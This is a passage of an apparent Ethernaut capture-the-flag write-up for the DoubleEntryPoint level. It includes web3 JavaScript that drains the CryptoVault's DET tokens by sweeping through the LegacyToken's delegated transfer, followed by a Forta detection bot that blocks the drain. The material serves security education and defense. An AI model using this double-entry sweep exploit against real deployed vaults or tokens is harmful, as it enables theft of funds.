contract DoubleEntryPoint is ERC20("DoubleEntryPointToken", "DET"), DelegateERC20, Ownable {
    address public cryptoVault;
    address public player;
    address public delegatedFrom;
    Forta public forta;

    constructor(address legacyToken, address vaultAddress, address fortaAddress, address playerAddress) public {
        delegatedFrom = legacyToken;
        forta = Forta(fortaAddress);
        player = playerAddress;
        cryptoVault = vaultAddress;
        _mint(cryptoVault, 100 ether);
    }

    modifier onlyDelegateFrom() {
        require(msg.sender == delegatedFrom, "Not legacy contract");
        _;
    }

    modifier fortaNotify() {
        address detectionBot = address(forta.usersDetectionBots(player));

        // Cache old number of bot alerts
        uint256 previousValue = forta.botRaisedAlerts(detectionBot);

        // Notify Forta
        forta.notify(player, msg.data);

        // Continue execution
        _;

        // Check if alarms have been raised
        if(forta.botRaisedAlerts(detectionBot) > previousValue) revert("Alert has been triggered, reverting");
    }

    function delegateTransfer( <==
        address to,
        uint256 value,
        address origSender
    ) public override onlyDelegateFrom fortaNotify returns (bool) {
        _transfer(origSender, to, value);
        return true;
    }
}
```

First, let's figure out the exploit that allows to drain the underlying (DET) tokens. If you see the `sweepToken()` method it can be seen that it restricts sweeping the underlying tokens with a `require` check - as expected. But take a look at `LegacyToken`'s `transfer()` method:

```solidity
if (address(delegate) == address(0)) {
    return super.transfer(to, value);
} else {
    return delegate.delegateTransfer(to, value, msg.sender);
}
```

Looks like it actually calls `delegateTransfer()` method of some `DelegateERC20` contract. But this `DelegateERC20` is nothing but the implementation of the underlying (`DET`) token itself. And `delegateTransfer()` simply transfers the tokens according to given parameters. The only restriction `delegateTransfer()` puts is that `msg.sender` must be the `LegacyToken` (`delegatedFrom` address) contract.

So we can indirectly sweep the underlying tokens through `transfer()` of `LegacyToken` contract. We simply call `sweepToken` with address of `LegacyToken` contract. That in turn would make the `LegacyContract` to call the `DoubleEntryPoint`'s (DET token) `delegateTransfer()` method.

```js
vault = await contract.cryptoVault();

// Check initial balance (100 DET)
await contract.balanceOf(vault).then((v) => v.toString()); // '100000000000000000000'

legacyToken = await contract.delegatedFrom();

// sweepTokens(..) function call data
sweepSig = web3.eth.abi.encodeFunctionCall(
  {
    name: "sweepToken",
    type: "function",
    inputs: [{ name: "token", type: "address" }],
  },
  [legacyToken]
);

// Send exploit transaction
await web3.eth.sendTransaction({ from: player, to: vault, data: sweepSig });

// Check balance (0 DET)
await contract.balanceOf(vault).then((v) => v.toString()); // '0'
```

And `CryptoVault` is swept of `DET` tokens!

This worked because during invocation `transfer()` of `LegacyToken` the `msg.sender` was `CryptoVault`. And when `delegateTransfer()` invoked right after, the `origSender` is the passed in address of `CryptoVault` contract and `msg.sender` is `LegacyToken` so `onlyDelegateFrom` modifier checks out.

Now to prevent this exploit we have to write a bot which would be a simple contract implementing the `IDetectionBot` interface. In the bot's `handleTransaction(..)` we could simply check that the address was not `CryptoVault` address. If so, raise alert. Hence preventing sweep.

Open up Remix and deploy the bot (on Rinkeby) with **contract.cryptoVault() address** and copy its address.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface IForta {
    function raiseAlert(address user) external;
}

contract FortaDetectionBot {
    address private cryptoVault;

    constructor(address _cryptoVault) {
        cryptoVault = _cryptoVault; // vault = await contract.cryptoVault();
    }

    function handleTransaction(address user, bytes calldata msgData) external {
        // Extract the address of original message sender
        // which should start at offset 168 (0xa8) of calldata
        address origSender;
        assembly {
            origSender := calldataload(0xa8)
        }

        if (origSender == cryptoVault) {
            IForta(msg.sender).raiseAlert(user);
        }
    }
}
```

Note that in the above `FortaDetectionBot` contract we extract the address of the original transaction sender by calculating its offset according to the [ABI encoding specs](https://docs.soliditylang.org/en/latest/abi-spec.html#argument-encoding) and [Layout of call data](https://docs.soliditylang.org/en/v0.8.3/internals/layout_in_calldata.html).

Understand the encoding rule of function parameters and use this knowledge to get the correct data offset you want to get in `calldata`.

i.e. Layout of calldata when `function handleTransaction(address user, bytes calldata msgData) external;` is called.

| calldata offset | length | element                                | type    | example value                                                      |
| --------------- | ------ | -------------------------------------- | ------- | ------------------------------------------------------------------ |
| 0x00            | 4      | function signature (handleTransaction) | bytes4  | 0x220ab6aa                                                         |
| 0x04            | 32     | user                                   | address | 0x000000000000000000000000XxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXx |
| 0x24            | 32     | offset of msgData                      | uint256 | 0x0000000000000000000000000000000000000000000000000000000000000040 |
| 0x44            | 32     | length of msgData                      | uint256 | 0x0000000000000000000000000000000000000000000000000000000000000064 |
| 0x64            | 4      | function signature (delegateTransfer)  | bytes4  | 0x9cd1a121                                                         |
| 0x68            | 32     | to                                     | address | 0x000000000000000000000000XxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXx |
| 0x88            | 32     | value                                  | uint256 | 0x0000000000000000000000000000000000000000000000056bc75e2d63100000 |
| 0xA8            | 32     | origSender                             | address | 0x000000000000000000000000XxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXx |
| 0xC8            | 28     | padding                                | bytes   | 0x00000000000000000000000000000000000000000000000000000000         |

Now set the bot in `Forta` contract:

```js
botAddr = "0x4587415153748ad20E7Cfc2F447984e6A74b585d";

// Forta contract address
forta = await contract.forta();

// setDetectionBot() function call data
setBotSig = web3.eth.abi.encodeFunctionCall(
  {
    name: "setDetectionBot",
    type: "function",
    inputs: [{ type: "address", name: "detectionBotAddress" }],
  },
  [botAddr]
);

// Send the transaction setting the bot
await web3.eth.sendTransaction({ from: player, to: forta, data: setBotSig });
```

Forta comprises a decentralized network of independent node operators who scan all transactions and block-by-block state changes for outlier transactions and threats. When an issue is detected, node operators send alerts to subscribers of potential risks, which enables them to take action.

The presented example is just for educational purpose since Forta bot is not modeled into smart contracts. In Forta, a bot is a code script to detect specific conditions or events, but when an alert is emitted it does not trigger automatic actions - at least not yet. In this level, the bot's alert effectively trigger a revert in the transaction, deviating from the intended Forta's bot design.

Detection bots heavily depends on contract's final implementations and some might be upgradeable and break bot's integrations, but to mitigate that you can even create a specific bot to look for contract upgrades and react to it. Learn how to do it [here](https://docs.forta.network/en/latest/quickstart/).

You have also passed through a recent security issue that has been uncovered during OpenZeppelin's latest [collaboration with Compound protocol](https://compound.finance/governance/proposals/76).

Having tokens that present a double entry point is a non-trivial pattern that might affect many protocols. This is because it is commonly assumed to have one contract per token. But it was not the case this time :) You can read the entire details of what happened [here](https://blog.openzeppelin.com/compound-tusd-integration-issue-retrospective/).

## MISC.

- [payable() function In solidity](https://ethereum.stackexchange.com/questions/20874/payable-function-in-solidity)
- [What are pure functions in Solidity?](https://www.educative.io/answers/what-are-pure-functions-in-solidity)
- [Solidity's documentation and learn its caveats](http://solidity.readthedocs.io/en/develop/contracts.html#view-functions)
- [Sending Ether (transfer, send, call)](https://solidity-by-example.org/sending-ether/) explains what fallback function is called based on calldata.

## Credits

- [Ethernaut Community Solutions](https://forum.openzeppelin.com/t/ethernaut-community-solutions/561)
- [Naveen on dev.to](https://dev.to/nvn/series/161104)
